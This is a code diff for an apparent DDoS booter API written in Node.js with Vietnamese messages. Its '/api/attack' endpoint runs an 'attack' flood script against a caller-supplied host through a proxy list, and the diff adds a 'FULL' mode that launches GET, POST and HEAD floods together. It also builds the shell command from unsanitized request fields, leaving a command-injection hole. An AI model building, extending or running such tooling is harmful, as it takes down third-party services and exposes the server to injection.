@@ -10,13 +10,26 @@ const validateInput = ({ key, host, time, method, port }) => {
   return null;
 };
 
-const executeAttack = (command, res, host, port, time, method) => {
+const executeAttack = (command, res, host, port, time, method, modul) => {
   exec(command, (error, stdout, stderr) => {
     activeAttacks--; currentPID = null;
     if (stderr) console.error(stderr);
   });
   currentPID = Math.floor(Math.random() * 10000) + 1;
-  res.status(200).json({ status: "SUCCESS", message: "LỆNH TẤN CÔNG ĐÃ GỬI", host, port, time, method, pid: currentPID });
+
+  let message = modul === "FULL" ? "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI" : "LỆNH TẤN CÔNG ĐÃ GỬI";
+  let modulInfo = modul === "FULL" ? "GET POST HEAD" : modul;  // Hiển thị các phương thức nếu modul là FULL
+
+  res.status(200).json({ 
+    status: "SUCCESS", 
+    message, 
+    host, 
+    port, 
+    time, 
+    modul: modulInfo,  // Thêm modul vào trong phản hồi
+    method, 
+    pid: currentPID 
+  });
 };
 
 app.get("/api/attack", (req, res) => {
@@ -29,17 +42,17 @@ app.get("/api/attack", (req, res) => {
     return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });
 
   activeAttacks++;
-  
+
   // Kiểm tra modul là FULL và gửi cả 3 lệnh GET, POST, HEAD
   if (modul === "FULL") {
     const methods = ["GET", "POST", "HEAD"];
     methods.forEach((method) => {
       const command = `node --max-old-space-size=65536 attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-      executeAttack(command, res, host, port, time, method);
+      executeAttack(command, res, host, port, time, method, modul);
     });
   } else {
     const command = `node --max-old-space-size=65536 attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true --delay 1 --debug false`;
-    executeAttack(command, res, host, port, time, method);
+    executeAttack(command, res, host, port, time, method, modul);
   }
 });
 
